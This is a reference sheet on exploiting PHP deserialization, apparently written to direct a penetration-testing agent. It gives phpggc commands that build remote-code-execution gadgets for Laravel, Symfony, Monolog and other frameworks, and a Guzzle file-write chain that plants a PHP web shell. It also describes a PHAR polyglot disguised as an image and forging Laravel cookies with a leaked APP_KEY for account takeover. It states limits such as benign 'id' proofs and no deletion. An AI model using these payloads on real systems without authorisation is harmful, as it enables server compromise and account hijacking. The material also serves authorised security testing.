# PHP Deserialization Reference

Use for PHP `serialize()`/`unserialize()`, PHAR metadata, and framework
signed/encrypted state. Impact-first: an `unserialize()` warning is a positive
oracle; phpggc builds the gadget; a leaked `APP_KEY` means you FORGE.

## Markers

- serialize: `O:<len>:"Class":<n>:{...}`, `a:<n>:{`, `s:<n>:"..."`, `i:<n>;`,
  `b:0;`, `N;`.
- Errors (capture, don't bail): `unserialize()` warning, `__PHP_Incomplete_Class`,
  magic-method traces (`__wakeup`, `__destruct`, `__toString`).
- PHAR: uploaded archive whose metadata reaches a file function; `phar://`.
- Framework: Laravel `laravel_session`/`X-XSRF-TOKEN`, Symfony `_fragment`/
  remember-me, `APP_KEY=base64:...`.

## Object injection oracle

Decode the blob, flip one byte of an `O:<len>` length or a class name in an OWNED
value, resend:
- `unserialize(): Error at offset` / `__PHP_Incomplete_Class` -> confirms
  server-side `unserialize()` of your input (deser-before-validation). Positive.
- If a custom class name is accepted and its `__wakeup`/`__destruct` fires (side
  effect observable) -> object injection is live -> build the gadget.

## phpggc — gadget chains

> **Tooling:** `phpggc` is **not installed on this host**. Install it first — `git clone https://github.com/ambionics/phpggc ~/tools/phpggc` — or use the alternative below. Do not silently skip the proof step; a skipped proof is a lost finding.
>
> `php` IS present (`php`, on PATH), so the cloned tool runs immediately; call it by
> absolute path (`~/tools/phpggc/phpggc …`). There is no curl equivalent — the gadget
> has to be generated. With nothing installed you can still fire the object-injection
> oracle above (byte-flip an owned blob, read the `unserialize()` warning), and you
> can hand-write a trivial `O:8:"stdClass":0:{}` probe to confirm the class name is
> honoured.

```bash
P=~/tools/phpggc/phpggc
$P -l                                  # list chains
$P Laravel/RCE9 system 'id'            # framework RCE gadget
$P Symfony/RCE4 system 'id'
$P Monolog/RCE1 system 'id'
$P Guzzle/FW1 /var/www/html/shell.php '<?php system($_GET[0]);'   # file write
$P Laravel/RCE9 system 'id' -b         # base64 output for a cookie/param
$P Laravel/RCE9 system 'id' -u         # url-encoded
```
Chains exist for Laravel, Symfony, Monolog, Guzzle, WordPress, Drupal, Magento,
ThinkPHP, Yii, Doctrine, Slim, SwiftMailer, CodeIgniter, Laminas. Pick by the
framework/version fingerprint. Deliver the gadget where the app calls
`unserialize()` (legacy API body, cookie, hidden field, cache value).

## PHAR polyglot -> deser via file function

High-value: a user-controlled path reaches `file_exists`/`is_dir`/`filesize`/
`file_get_contents`/`getimagesize`/`mime_content_type`/archive/image handling, and
`phar://` is not blocked. PHAR metadata is `unserialize()`d on access.

```bash
# build a PHAR whose metadata is a phpggc gadget, disguised as an image
~/tools/phpggc/phpggc -p phar -o poly.phar Monolog/RCE1 system 'id'
# prepend a valid image header if the upload validates magic bytes (JPEG/GIF polyglot)
```
Upload `poly.phar` (renamed `.jpg`/`.gif` if needed), then trigger a file function
against `phar:///path/to/upload/poly.jpg`. The gadget's `__destruct` runs -> RCE.
Confirm the reachable file function first (benign path echoes an error revealing
the call), then fire the gadget with `id` / an OOB `curl`.

## Laravel APP_KEY -> encrypted-cookie RCE (CVE-2018-15133)

`APP_KEY` leaks via `.env` disclosure, an `APP_DEBUG=true` Ignition error page, or
GitHub. Laravel decrypts+MACs the cookie then `unserialize()`s it. Encrypt a
`phpggc Laravel/RCE*` gadget under `APP_KEY` (`laravel-crypto-killer.py`) and set
it as the cookie/`X-XSRF-TOKEN`. Full steps in `leaked-key-forge.md`. Even when the
gadget is patched, forging the encrypted cookie with a leaked `APP_KEY` is still
session forgery / ATO.

Symfony equivalent: leaked `APP_SECRET` -> forge `_fragment`/remember-me/signed
URIs; `_fragment` + `ESI`/`render` can reach RCE. No CVE id — it is a design
consequence of holding the secret, not a versioned bug, so do not gate it on a
version. Separately, `CVE-2019-18889` (Symfony 3.4.0-3.4.34, 4.2.0-4.2.11,
4.3.0-4.3.7) is a `symfony/cache` gadget: serializing certain cache-adapter
interfaces reaches remote code injection — a different sink, reachable through any
`unserialize()` you already control.

## Evidence that converts

- `phpggc` gadget in the `unserialize()` sink -> benign `id` / OOB `curl` = RCE.
- PHAR polyglot uploaded + file-function trigger -> `__destruct` command output.
- `unserialize()` warning / incomplete-class error naming your input = deser
  confirmed (build the gadget, don't stop).
- Forged Laravel/Symfony cookie with leaked `APP_KEY`/`APP_SECRET` accepted = ATO.

Never attempt production file deletion; the file-WRITE gadget targets a sentinel
path you control, and command proof is a benign read-only `id`.
